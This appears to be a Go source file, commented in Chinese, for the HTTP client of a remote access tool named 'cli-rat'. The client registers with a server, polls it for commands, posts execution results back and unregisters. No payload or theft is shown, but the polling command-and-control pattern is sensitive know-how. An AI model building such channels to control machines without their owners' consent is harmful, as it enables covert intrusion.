// Package httpclient 提供HTTP通信客户端
// 负责客户端与服务端之间的所有HTTP通信
package httpclient

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	"cli-rat/types"
)

// Client HTTP客户端结构体
// 封装了与服务端通信的所有方法
type Client struct {
	ServerAddr string // 服务端地址，格式：http://host:port
}

// NewClient 创建新的HTTP客户端
// serverAddr: 服务端地址
func NewClient(serverAddr string) *Client {
	return &Client{ServerAddr: serverAddr}
}

// Register 向服务端注册客户端
// name: 客户端名称
// 返回注册响应，包含分配的客户端ID
func (c *Client) Register(name string) (*types.RegisterResponse, error) {
	// 构建注册请求
	req := types.RegisterRequest{Name: name}
	data, _ := json.Marshal(req)

	// 发送POST请求到 /register 端点
	resp, err := http.Post(c.ServerAddr+"/register", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return nil, fmt.Errorf("注册失败: %v", err)
	}
	defer resp.Body.Close()

	// 解析响应
	var result types.RegisterResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("解析响应失败: %v", err)
	}

	return &result, nil
}

// Poll 轮询服务端获取待执行命令
// clientID: 客户端ID
// 返回轮询响应，如果有命令则包含命令详情，否则状态为 no_command
func (c *Client) Poll(clientID string) (*types.PollResponse, error) {
	// 发送GET请求到 /poll 端点，附带client_id参数
	resp, err := http.Get(fmt.Sprintf("%s/poll?client_id=%s", c.ServerAddr, clientID))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// 解析响应
	var result types.PollResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	return &result, nil
}

// Submit 提交命令执行结果到服务端
// cmdID: 命令ID
// status: 执行状态（completed/failed）
// result: 执行结果输出
func (c *Client) Submit(cmdID, status, result string) error {
	// 构建提交请求
	req := types.SubmitRequest{
		CommandID: cmdID,
		Status:    status,
		Result:    result,
	}
	data, _ := json.Marshal(req)

	// 发送POST请求到 /result 端点
	resp, err := http.Post(c.ServerAddr+"/result", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

// Unregister 向服务端注销客户端
// clientID: 要注销的客户端ID
func (c *Client) Unregister(clientID string) error {
	// 构建注销请求
	req := types.UnregisterRequest{ClientID: clientID}
	data, _ := json.Marshal(req)

	// 发送POST请求到 /unregister 端点
	http.Post(c.ServerAddr+"/unregister", "application/json", bytes.NewBuffer(data))
	return nil
}

// ===== 通用HTTP请求方法 =====

// PostJSON 发送POST JSON请求
// url: 请求URL
// body: 请求体（将被序列化为JSON）
// 返回响应体字节数组
func PostJSON(url string, body interface{}) ([]byte, error) {
	// 序列化请求体
	data, err := json.Marshal(body)
	if err != nil {
		return nil, err
	}

	// 发送POST请求
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// 读取响应体
	return io.ReadAll(resp.Body)
}

// GetJSON 发送GET请求
// url: 请求URL
// 返回响应体字节数组
func GetJSON(url string) ([]byte, error) {
	// 发送GET请求
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// 读取响应体
	return io.ReadAll(resp.Body)
}
